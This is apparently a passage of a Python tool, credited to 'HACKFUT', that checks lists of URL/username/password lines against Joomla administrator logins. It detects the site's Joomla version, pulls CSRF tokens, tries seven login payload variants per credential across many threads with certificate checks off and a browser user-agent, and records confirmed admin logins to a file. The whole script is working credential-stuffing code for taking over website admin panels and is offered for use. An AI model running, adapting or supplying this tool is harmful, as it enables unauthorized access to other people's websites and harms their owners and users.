⠀⠀⠀⢺⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣠⡄⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢸⡇⠀⡆⢹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠺⠃⠀⠀⠀⢀⡀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

"""


def print_banner():
    print(Fore.LIGHTGREEN_EX + BANNER)
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT +
          "  Joomla Admin Login Checker v9.0 ULTIMATE" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX +
          "  Version-Aware + Multi-Payload + Multi-Path" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX +
          "  Author: HACKFUT" + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "  " + "-" * 62 + Style.RESET_ALL)
    print()


# ═══════════════════════════════════════════════════════════════════
#  PARSING
# ═══════════════════════════════════════════════════════════════════

def parse_login_line(line):
    try:
        url, cred = line.strip().split("#", 1)
        username, password = cred.split("@", 1)
        return url.strip(), username.strip(), password.strip()
    except ValueError:
        return None, None, None


def normalize_admin_url(url):
    url = url.strip().rstrip("/")
    if "/administrator/index" in url:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}", url
    if url.endswith("/administrator"):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}", url + "/index.php"
    return url, url + "/administrator/index.php"


def extract_hidden_keys(response_text):
    pattern = (
        r'<input\s+[^>]*type=["\']hidden["\'][^>]*'
        r'name=["\']([a-zA-Z0-9]{32,})["\'][^>]*'
        r'value=["\'"]([^"\']+)["\']'
    )
    return re.findall(pattern, response_text, re.IGNORECASE)


# ═══════════════════════════════════════════════════════════════════
#  VERSION DETECTION
# ═══════════════════════════════════════════════════════════════════

def detect_version(session, base_url, admin_url, timeout=10):
    """Detect Joomla version from multiple sources."""
    version = "Unknown"
    confidence = 0

    # Source 1: HTML of admin page
    try:
        r = session.get(admin_url, timeout=timeout, verify=False)
        if r.status_code == 200:
            for pattern, ver in VERSION_PATTERNS:
                if re.search(pattern, r.text, re.I):
                    version = ver
                    confidence = 80
                    break
    except Exception:
        pass

    # Source 2: Manifest
    if confidence < 80:
        try:
            manifest = f"{base_url}/administrator/manifests/files/joomla.xml"
            r = session.get(manifest, timeout=timeout, verify=False)
            if r.status_code == 200:
                m = re.search(r"<version>([\d.]+)</version>", r.text, re.I)
                if m:
                    full = m.group(1)
                    major = full.split(".")[0]
                    minor = full.split(".")[1] if "." in full else "0"
                    if major == "5": version = "5.x"
                    elif major == "4": version = "4.x"
                    elif major == "3": version = "3.x"
                    elif major == "2": version = "2.5"
                    elif major == "1":
                        if minor == "5": version = "1.5"
                        elif minor == "6": version = "1.6"
                        elif minor == "7": version = "1.7"
                        else: version = "1.0"
                    confidence = 100
        except Exception:
            pass

    # Source 3: Legacy indicators
    if confidence < 50:
        try:
            r = session.get(admin_url, timeout=timeout, verify=False)
            if r.status_code == 200:
                html = r.text.lower()
                if "index2.php" in html or "mosconfig" in html:
                    version = "1.0"
                    confidence = 70
                elif 'name="passwd"' in html and "jos_" in html:
                    version = "1.5"
                    confidence = 60
                elif "joomla-field" in html or "bootstrap5" in html:
                    version = "5.x"
                    confidence = 50
                elif "bootstrap" in html and "joomla" in html:
                    version = "3.x"
                    confidence = 40
        except Exception:
            pass

    return version, confidence


# ═══════════════════════════════════════════════════════════════════
#  ⭐ MULTI-PAYLOAD GENERATOR
# ═══════════════════════════════════════════════════════════════════

def generate_login_payloads(version, username, password, tokens):
    """
    Generate MULTIPLE login payloads for the SAME credential.

    Combines BOTH strategies:
      - Multi-payload (essaye toutes les variantes)
      - Version-specific (utilise la version détectée en priorité)
    """
    payloads = []

    # ═══ Payload 1: Joomla 1.5-3.x (most common) ═══
    p1 = {
        "username": username,
        "passwd": password,
        "option": "com_login",
        "task": "login",
    }
    p1.update(tokens)
    payloads.append(("v1.5-3.x", p1))

    # ═══ Payload 2: Joomla 4.x-5.x (password field) ═══
    p2 = {
        "username": username,
        "password": password,
        "option": "com_login",
        "task": "login",
    }
    p2.update(tokens)
    payloads.append(("v4.x-5.x", p2))

    # ═══ Payload 3: Joomla 1.5 legacy (com_user) ═══
    p3 = {
        "username": username,
        "passwd": password,
        "option": "com_user",
        "task": "login",
    }
    p3.update(tokens)
    payloads.append(("v1.5-legacy", p3))

    # ═══ Payload 4: Joomla 1.0 legacy (user + pass) ═══
    p4 = {
        "user": username,
        "pass": password,
        "submit": "Login",
    }
    p4.update(tokens)
    payloads.append(("v1.0-pass", p4))

    # ═══ Payload 5: Joomla 1.0 hybrid (username + passwd) ═══
    p5 = {
        "username": username,
        "passwd": password,
        "submit": "Login",
    }
    p5.update(tokens)
    payloads.append(("v1.0-passwd", p5))

    # ═══ Payload 6: Unknown — try BOTH fields ═══
    p6 = {
        "username": username,
        "passwd": password,
        "password": password,
        "option": "com_login",
        "task": "login",
    }
    p6.update(tokens)
    payloads.append(("unknown-both", p6))

    # ═══ Payload 7: Joomla 1.5 with base64 return ═══
    p7 = {
        "username": username,
        "passwd": password,
        "option": "com_login",
        "task": "login",
        "return": "aW5kZXgucGhw",
    }
    p7.update(tokens)
    payloads.append(("v1.5-return", p7))

    return payloads


# ═══════════════════════════════════════════════════════════════════
#  VERSION-SPECIFIC PROTECTED PATHS
# ═══════════════════════════════════════════════════════════════════

def get_protected_paths_for_version(version):
    """Return the right protected paths to check for the version."""
    if version in ("1.0",):
        return [
            "/administrator/index2.php?option=com_content",
            "/administrator/index2.php?option=com_users",
            "/administrator/index2.php?option=com_admin",
            "/administrator/index.php?option=com_content",
            "/administrator/index.php",
        ]
    if version in ("1.5",):
        return [
            "/administrator/index2.php?option=com_content",
            "/administrator/index2.php?option=com_users",
            "/administrator/index2.php?option=com_cpanel",
            "/administrator/index.php?option=com_content",
            "/administrator/index.php?option=com_users&view=users",
            "/administrator/index.php",
        ]
    if version in ("1.6", "1.7", "2.5"):
        return [
            "/administrator/index.php?option=com_cpanel",
            "/administrator/index.php?option=com_users&view=users",
            "/administrator/index.php?option=com_content",
            "/administrator/index.php?option=com_menus",
            "/administrator/index.php",
        ]
    # 3.x, 4.x, 5.x, Unknown
    return DEFAULT_PROTECTED_PATHS


# ═══════════════════════════════════════════════════════════════════
#  VERSION-AWARE CHECKS
# ═══════════════════════════════════════════════════════════════════

def has_logged_in_cookie(session, version="Unknown"):
    """Check for ANY logged-in cookie, VERSION-AWARE."""
    cookie_names = VERSION_COOKIES.get(version, VERSION_COOKIES["Unknown"])

    for cookie in session.cookies:
        name = cookie.name.lower()
        value = (cookie.value or "").lower()

        # Exact match on known cookie names
        if name in cookie_names and value and len(value) > 10:
            return True

        # Heuristic: session cookie with length > 20
        if "session" in name and len(value) > 20:
            return True

        # Joomla logged-in cookie
        if name == "joomla_user_state" and value == "logged_in":
            return True

    return False


def has_login_form(html):
    """Check if HTML contains a login form."""
    if not html:
        return True
    html_lower = html.lower()
    return any(m.lower() in html_lower for m in LOGIN_PAGE_MARKERS)


def has_admin_content(html, version="Unknown"):
    """Check if HTML has admin content, VERSION-AWARE + ADAPTIVE THRESHOLD."""
    if not html:
        return False

    html_lower = html.lower()
    markers = VERSION_ADMIN_MARKERS.get(version,
                                         VERSION_ADMIN_MARKERS["Unknown"])

    matches = sum(1 for m in markers if m.lower() in html_lower)

    # Old Joomla needs fewer markers (less HTML)
    if version in ("1.0", "1.5", "1.6", "1.7", "2.5"):
        return matches >= 2
    return matches >= 3


def check_failure_markers(html):
    """Check for failure messages."""
    if not html:
        return False
    html_lower = html.lower()
    return any(m in html_lower for m in FAILURE_MARKERS)


# ═══════════════════════════════════════════════════════════════════
#  QUICK CHECK (login response only)
# ═══════════════════════════════════════════════════════════════════

def verify_login_response(session, login_resp, version):
    """
    Quick check: did the login response itself show success?
    Used by the multi-payload strategy for fast iteration.
    """
    # Failure markers → fail
    if check_failure_markers(login_resp.text):
        return False

    # Cookie check
    if has_logged_in_cookie(session, version):
        return True

    # Admin content + no login form
    if has_admin_content(login_resp.text, version) and \
       not has_login_form(login_resp.text):
        return True

    return False


# ═══════════════════════════════════════════════════════════════════
#  STRICT VERIFICATION (VERSION-AWARE)
# ═══════════════════════════════════════════════════════════════════

def strict_verify_path(session, login_resp, check_resp, version):
    """Full verification with one protected path."""
    if check_failure_markers(login_resp.text):
        return False, "failure_login"

    if check_failure_markers(check_resp.text):
        return False, "failure_check"

    has_cookie = has_logged_in_cookie(session, version)
    has_login_in_check = has_login_form(check_resp.text)
    has_admin_in_check = has_admin_content(check_resp.text, version)

    # Version-aware decision
    if version in ("1.0", "1.5", "1.6", "1.7", "2.5"):
        if has_admin_in_check and not has_login_in_check:
            return True, f"admin_content_v{version}"
        if has_cookie and not has_login_in_check:
            return True, f"cookie_v{version}"
        if has_login_in_check:
            return False, "login_form_present"
        return False, "no_content_v1x"
    else:
        if not (has_cookie or has_admin_in_check):
            return False, "no_cookie_no_admin_content"
        if has_login_in_check:
            return False, "login_form_present"
        if has_cookie:
            return True, "joomla_user_state_cookie"
        if has_admin_in_check:
            return True, "admin_content_markers"
        return False, "no_conclusive_signal"


# ═══════════════════════════════════════════════════════════════════
#  ⭐ MAIN LOGIN FUNCTION — MULTI-PAYLOAD + MULTI-PATH
# ═══════════════════════════════════════════════════════════════════

def perform_login(url, username, password):
    """
    Attempt login with ULTIMATE STRATEGY:
      1. Detect version
      2. Get login form + CSRF token
      3. Generate ALL 7 payloads (all versions)
      4. Try EACH payload
      5. For each payload, verify with version-aware paths
    """
    base_url, admin_url = normalize_admin_url(url)

    session = requests.Session()
    session.verify = False

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/128.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # ═══ STEP 1: Detect version ═══
        version, confidence = detect_version(session, base_url, admin_url)

        # ═══ STEP 2: Find the login form ═══
        login_urls_to_try = []
        if version in ("1.0", "1.5"):
            login_urls_to_try = [
                f"{base_url}/administrator/index2.php",
                f"{base_url}/administrator/index.php",
                admin_url,
            ]
        else:
            login_urls_to_try = [admin_url]
            for path in ADMIN_PATHS[:4]:
                alt = urljoin(base_url, path)
                if alt not in login_urls_to_try:
                    login_urls_to_try.append(alt)

        r = None
        final_login_url = None
        for candidate in login_urls_to_try:
            try:
                r = session.get(candidate, headers=headers, timeout=10)
                if r.status_code == 200:
                    final_login_url = candidate
                    break
            except Exception:
                continue

        if r is None or r.status_code != 200:
            with print_lock:
                print(Fore.RED + f"[! ERR]  {username} | Admin not reachable"
                      + Style.RESET_ALL)
            _save_failed(url, username, password)
            return

        admin_url = final_login_url

        # ═══ STEP 3: Extract CSRF tokens ═══
        hidden_keys = extract_hidden_keys(r.text)
        tokens = {}
        if hidden_keys:
            token_name, token_value = hidden_keys[0]
            tokens[token_name] = token_value

        # ═══ STEP 4: Generate ALL payloads ═══
        payloads = generate_login_payloads(version, username, password, tokens)

        # ═══ STEP 5: Try EACH payload + verify with VERSION-AWARE paths ═══
        is_success = False
        success_payload = ""
        success_reason = ""
        tried_payloads = []

        protected_paths = get_protected_paths_for_version(version)

        for payload_name, payload in payloads:
            tried_payloads.append(payload_name)

            try:
                # Fresh session for each payload to avoid cookie pollution
                session.cookies.clear()

                # Re-fetch login page to get fresh token
                try:
                    r_fresh = session.get(admin_url, headers=headers,
                                          timeout=10)
                    if r_fresh.status_code == 200:
                        hidden_fresh = extract_hidden_keys(r_fresh.text)
                        if hidden_fresh:
                            token_name, token_value = hidden_fresh[0]
                            payload[token_name] = token_value
                except Exception:
                    pass

                # POST login with this payload
                login_resp = session.post(
                    admin_url, headers=headers, data=payload,
                    timeout=10, allow_redirects=True
                )

                # ═══ QUICK CHECK on login response ═══
                if verify_login_response(session, login_resp, version):
                    is_success = True
                    success_payload = payload_name
                    success_reason = "login_response_ok"
                    break

                # ═══ FULL VERIFICATION with version-aware protected paths ═══
                for protected_path in protected_paths:
                    check_url = urljoin(base_url, protected_path)
                    try:
                        check_resp = session.get(
                            check_url, headers=headers, timeout=10,
                            allow_redirects=True
                        )
                        v_success, v_reason = strict_verify_path(
                            session, login_resp, check_resp, version
                        )
                        if v_success:
                            is_success = True
                            success_payload = payload_name
                            success_reason = v_reason
                            break
                    except requests.exceptions.RequestException:
                        continue

                if is_success:
                    break

            except requests.exceptions.RequestException:
                continue

        # ═══ STEP 6: Final verdict ═══
        if is_success:
            with print_lock:
                ver_tag = f"v{version}" if version != "Unknown" else "v?"
                print(Fore.GREEN + Style.BRIGHT +
                      f"[✓ REAL]  {username}@{password} | "
                      f"{base_url} | {ver_tag} | "
                      f"payload={success_payload} | {success_reason}"
                      + Style.RESET_ALL)
            _save_success(url, username, password, version,
                          f"{success_payload} | {success_reason}")
        else:
            with print_lock:
                ver_tag = f"v{version}" if version != "Unknown" else "v?"
                print(Fore.RED +
                      f"[✗ FAIL] {username}@{password} | "
                      f"{base_url} | {ver_tag} | "
                      f"tried {len(tried_payloads)} payloads"
                      + Style.RESET_ALL)
            _save_failed(url, username, password, version,
                         f"tried {len(tried_payloads)} payloads")

    except requests.exceptions.ConnectionError:
        with print_lock:
            print(Fore.RED + f"[! ERR]  {username} | Connection refused"
                  + Style.RESET_ALL)
        _save_failed(url, username, password)
    except requests.exceptions.Timeout:
        with print_lock:
            print(Fore.RED + f"[! ERR]  {username} | Timeout"
                  + Style.RESET_ALL)
        _save_failed(url, username, password)
    except requests.exceptions.RequestException as e:
        with print_lock:
            print(Fore.RED + f"[! ERR]  {username} | {type(e).__name__}"
                  + Style.RESET_ALL)
        _save_failed(url, username, password)


# ═══════════════════════════════════════════════════════════════════
#  FILE I/O
# ═══════════════════════════════════════════════════════════════════

def _save_success(url, username, password, version="Unknown", reason=""):
    with print_lock:
        with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{url}#{username}@{password} | version={version} | {reason}\n")


def _save_failed(url, username, password, version="Unknown", reason=""):
    with print_lock:
        with open(FAILED_FILE, "a", encoding="utf-8") as f:
            f.write(f"{url}#{username}@{password} | version={version} | {reason}\n")


def _reset_output_files():
    open(SUCCESS_FILE, "w", encoding="utf-8").close()
    open(FAILED_FILE, "w", encoding="utf-8").close()


# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════

def main():
    print_banner()

    login_file = input(
        Fore.LIGHTRED_EX + "  By HACKFUT — " + Style.RESET_ALL +
        Fore.LIGHTCYAN_EX + "Give me your file: " + Style.RESET_ALL
    ).strip()

    if not login_file:
        print(Fore.RED + "  [!] No file provided" + Style.RESET_ALL)
        return

    try:
        with open(login_file, "r", encoding="utf-8") as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(Fore.RED + f"  [!] File '{login_file}' not found"
              + Style.RESET_ALL)
        return

    targets = []
    for line in lines:
        url, username, password = parse_login_line(line)
        if url and username and password:
            targets.append((url, username, password))
        elif line.strip():
            print(Fore.YELLOW + f"  [!] Invalid: {line.strip()}"
                  + Style.RESET_ALL)

    if not targets:
        print(Fore.RED + "  [!] No valid credentials" + Style.RESET_ALL)
        return

    _reset_output_files()

    print(Fore.CYAN + f"  [*] Loaded {len(targets)} credentials"
          + Style.RESET_ALL)
    print(Fore.CYAN + f"  [*] Threads: {MAX_THREADS}" + Style.RESET_ALL)
    print(Fore.CYAN + f"  [*] Mode: ULTIMATE (Multi-Payload + Multi-Path + Version-Aware)"
          + Style.RESET_ALL)
    print()
    print(Fore.LIGHTBLACK_EX + "  [*] Payloads tried per credential:"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      1. username+passwd+com_login   (1.5-3.x)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      2. username+password+com_login (4.x-5.x)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      3. username+passwd+com_user    (1.5 leg)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      4. user+pass+submit            (1.0)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      5. username+passwd+submit      (1.0 hybrid)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      6. username+passwd+password    (Unknown)"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      7. username+passwd+return      (1.5 base64)"
          + Style.RESET_ALL)
    print()
    print(Fore.LIGHTBLACK_EX + "  [*] Protected paths (version-aware):"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      - 1.0/1.5 → index2.php paths"
          + Style.RESET_ALL)
    print(Fore.LIGHTBLACK_EX + "      - 3.x+    → index.php paths"
          + Style.RESET_ALL)
    print()

    start = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [
            executor.submit(perform_login, url, username, password)
            for (url, username, password) in targets
        ]
        for _ in as_completed(futures):
            pass

    elapsed = time.time() - start

    success_count = 0
    failed_count = 0
    try:
        with open(SUCCESS_FILE, "r", encoding="utf-8") as f:
            success_count = sum(1 for _ in f)
    except Exception:
        pass
    try:
        with open(FAILED_FILE, "r", encoding="utf-8") as f:
            failed_count = sum(1 for _ in f)
    except Exception:
        pass

    print()
    print(Fore.CYAN + "  " + "=" * 62 + Style.RESET_ALL)
    print(Fore.CYAN + "  DONE" + Style.RESET_ALL)
    print(Fore.CYAN + "  " + "=" * 62 + Style.RESET_ALL)
    print(Fore.GREEN + f"  [+] Confirmed: {success_count}"
          + Style.RESET_ALL)
    print(Fore.RED + f"  [-] Failed:    {failed_count}"
          + Style.RESET_ALL)
    print(Fore.CYAN + f"  [*] Elapsed: {elapsed:.1f}s"
          + Style.RESET_ALL)
    print(Fore.CYAN + "  " + "-" * 62 + Style.RESET_ALL)
    print(Fore.GREEN + f"  [+] {SUCCESS_FILE}" + Style.RESET_ALL)
    print(Fore.RED + f"  [-] {FAILED_FILE}" + Style.RESET_ALL)
    print(Fore.CYAN + "  " + "=" * 62 + Style.RESET_ALL)
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "  HACKFUT"
          + Style.RESET_ALL)
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print(Fore.YELLOW + "  [!] Interrupted" + Style.RESET_ALL)
        sys.exit(0)